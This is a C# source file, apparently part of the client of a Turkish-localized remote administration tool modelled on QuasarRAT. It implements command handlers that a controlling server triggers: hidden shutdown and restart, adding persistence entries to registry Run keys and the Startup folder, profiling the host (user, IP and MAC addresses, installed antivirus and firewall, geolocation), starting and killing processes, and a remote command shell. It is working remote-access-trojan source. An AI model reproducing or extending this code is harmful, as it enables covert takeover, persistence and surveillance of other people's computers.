using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Eklentiler;
using xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri;
using xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.KuuhakuÇekirdek.Yardımcılar;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleGetDrives(Paketler.ServerPaketleri.GetDrives command, Client client)
        {
            DriveInfo[] drives;
            try
            {
                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                new Paketler.ClientPaketleri.SetStatusFileManager("Sürücü Çek - I/O Hatası", false).Execute(client);
                return;
            }
            catch (UnauthorizedAccessException)
            {
                new Paketler.ClientPaketleri.SetStatusFileManager("Sürücü Çek - İzni Yok", false).Execute(client);
                return;
            }

            if (drives.Length == 0)
            {
                new Paketler.ClientPaketleri.SetStatusFileManager("Sürücü Çek - Sürücü Yok", false).Execute(client);
                return;
            }

            string[] görüntüAdı = new string[drives.Length];
            string[] anaDizin = new string[drives.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                string volumeLabel = null;
                try
                {
                    volumeLabel = drives[i].VolumeLabel;
                }
                catch
                {
                }

                if (string.IsNullOrEmpty(volumeLabel))
                {
                    görüntüAdı[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
                        FormatYardımcısı.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                else
                {
                    görüntüAdı[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
                        FormatYardımcısı.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                anaDizin[i] = drives[i].RootDirectory.FullName;
            }

            new Paketler.ClientPaketleri.GetDrivesResponse(görüntüAdı, anaDizin).Execute(client);
        }

        public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Action)
                {
                    case KapatmaEylemleri.Kapat:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // kapatma
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case KapatmaEylemleri.YenidenBaşlat:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // yeniden başlatma
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case KapatmaEylemleri.BeklemeyeAl:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // beklemeye alma
                        break;
                }
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Eylem Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetStartupItems(GetStartupItems command, Client client)
        {
            try
            {
                List<string> startupItems = new List<string>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(
                            key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(
                            key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(
                            key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(
                            key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                    }
                }
                if (PlatformYardımcısı.A64Bitmi)
                {
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(
                                key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                        }
                    }
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) 
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(
                                key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files =
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(from file in files
                        where file.Name != "desktop.ini"
                        select string.Format("{0}||{1}", file.Name, file.FullName)
                        into formattedKeyValue
                        select "6" + formattedKeyValue);
                }

                new GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Oto-Başlangıç Öğelerini Alma Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
        {
            // Kesin yöntem bulana kadar try
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 4:
                        if (!PlatformYardımcısı.A64Bitmi)
                            throw new NotSupportedException(
                                "Bu İşlem Sadece 64 Bit İşletim Sistemlerinde Destekleniyor.");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path,
                            true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 5:
                        if (!PlatformYardımcısı.A64Bitmi)
                            throw new NotSupportedException(
                                "Bu İşlem Sadece 64 Bit İşletim Sistemlerinde Destekleniyor.");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name,
                            command.Path, true))
                        {
                            throw new Exception("Değer Eklenemedi");
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Oto-Başlangıç Öğesi Ekleme Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 4:
                        if (!PlatformYardımcısı.A64Bitmi)
                            throw new NotSupportedException(
                                "Bu İşlem Sadece 64 Bit İşletim Sistemlerinde Destekleniyor.");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 5:
                        if (!PlatformYardımcısı.A64Bitmi)
                            throw new NotSupportedException(
                                "Bu İşlem Sadece 64 Bit İşletim Sistemlerinde Destekleniyor.");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Değer Kaldırılamadı");
                        }
                        break;
                    case 6:
                        var startupItemPath = Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("Böyle Bir Dosya Bulunmuyor.");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Oto-Başlangıç Öğesi Kaldırma Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";


                string[] infoCollection = new string[]
                {
                    "İşlemci (CPU)",
                    CihazYardımcısı.GetCpuName(),
                    "Bellek (RAM)",
                    string.Format("{0} MB", CihazYardımcısı.GetTotalRamAmount()),
                    "Ekran Kartı (GPU)",
                    CihazYardımcısı.GetGpuName(),
                    "Kullanıcı Adı",
                    WindowsAccountHelper.GetName(),
                    "PC Adı",
                    SystemHelper.GetPcName(),
                    "Domain İsmi",
                    domainName,
                    "Host İsmi",
                    hostName,
                    "Sistem Sürücüsü",
                    Path.GetPathRoot(Environment.SystemDirectory),
                    "Sistem Dizini",
                    Environment.SystemDirectory,
                    "Açık Olma Süresi",
                    SystemHelper.GetUptime(),
                    "MAC Adresi",
                    CihazYardımcısı.GetMacAddress(),
                    "LAN IP Adresi",
                    CihazYardımcısı.GetLanIp(),
                    "WAN IP Adresi",
                    GeoLocationHelper.GeoInfo.Ip,
                    "Antivirus",
                    SystemHelper.GetAntivirus(),
                    "Güvenlik Duvarı",
                    SystemHelper.GetFirewall(),
                    "Saat Dilimi",
                    GeoLocationHelper.GeoInfo.SaatDilimi,
                    "Ülke",
                    GeoLocationHelper.GeoInfo.Ülke,
                    "ISP",
                    GeoLocationHelper.GeoInfo.Isp
                };

                new GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (var p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleDoProcessStart(DoProcessStart command, Client client)
        {
            if (string.IsNullOrEmpty(command.Processname))
            {
                new SetStatus("İşlem Başlatılamadı!").Execute(client);
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.Processname
                };
                Process.Start(startInfo);
            }
            catch
            {
                new SetStatus("İşlem Başlatılamadı!").Execute(client);
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoProcessKill(DoProcessKill command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoShellExecute(DoShellExecute command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }
    }
}